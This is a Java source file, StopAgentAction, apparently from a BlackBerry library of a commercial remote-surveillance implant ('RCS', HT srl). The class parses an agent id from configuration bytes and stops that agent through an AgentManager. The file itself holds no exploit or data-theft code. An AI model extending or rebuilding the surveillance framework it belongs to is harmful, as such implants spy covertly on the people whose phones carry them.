//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : StopAgentAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;
import blackberry.AgentManager;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;

// TODO: Auto-generated Javadoc
/**
 * The Class StopAgentAction.
 */
public final class StopAgentAction extends SubAction {
    //#ifdef DEBUG
    static Debug debug = new Debug("StopAgentAction", DebugLevel.VERBOSE);
    //#endif
    int agentId;

    /**
     * Instantiates a new stop agent action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public StopAgentAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {
        //#ifdef DEBUG
        debug.info("Stopping " + agentId);
        //#endif
        final AgentManager agentManager = AgentManager.getInstance();

        final boolean ret = agentManager.stop(agentId);
        //#ifdef DEBUG
        debug.trace("Stopped " + agentId);
        //#endif
        // disable?
        return ret;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            agentId = databuffer.readInt();
            //#ifdef DEBUG
            debug.trace("agentId: " + agentId);
            //#endif

        } catch (final EOFException e) {
            //#ifdef DEBUG
            debug.error("params FAILED");
            //#endif
            return false;
        }

        return true;
    }

    public String toString() {
        return "Stop " + agentId;
    }
}
